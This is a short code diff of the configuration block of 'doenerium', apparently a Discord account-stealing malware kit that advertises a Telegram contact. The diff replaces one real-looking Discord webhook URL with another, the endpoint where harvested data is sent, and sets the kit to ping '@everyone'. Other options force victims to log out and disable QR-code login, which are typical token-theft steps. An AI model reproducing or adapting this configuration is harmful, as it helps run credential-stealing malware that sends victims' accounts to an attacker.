@@ -13,14 +13,14 @@ const fs = require("fs");
 var config = {
     brand: "doenerium",
 
-    webhook: "https://discord.com/api/webhooks/982961575004602408/Z-u10xmdhzOH2Gfz17uUL1nHYwTZ8GmvMsfNEuxxdHSKK_Pd-ppibE0WvZo4W0M5dCiU",
+    webhook: "https://discord.com/api/webhooks/986732629871198299/HbfgOW7Ua0K_f_opSbLGPIAKtBBnOJaSFXTSX0fZHqOF3KEhDnv25_SHF9rD8zM7UGqm",
 
     logout: true,
     disable_qr_code: true,
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@everyone"],
 
     embed: {
         username: "doenerium | t.me/doener2323",
